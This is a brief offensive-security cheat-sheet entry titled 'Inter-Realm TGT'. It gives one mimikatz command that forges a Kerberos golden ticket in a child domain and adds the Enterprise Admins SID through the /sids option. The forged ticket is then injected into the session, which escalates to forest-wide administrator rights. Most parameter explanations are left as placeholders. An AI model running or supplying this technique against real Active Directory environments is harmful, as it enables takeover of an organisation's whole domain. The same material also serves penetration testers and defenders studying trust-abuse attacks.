# Inter-Realm TGT

{% code overflow="wrap" %}
```powershell
mimikatz # kerberos::golden /user:Administrator /domain:<child domain> /sid:S-xxx /service:krbtgt /rc4:<Password hash of krbtgt user> /sids:<SID of Enterprise Admins group> /ptt
```
{% endcode %}

a. `/user:Administrator` : ...

b. ...

c. `/service:krbtgt` : specifies that this ticket is a TGT
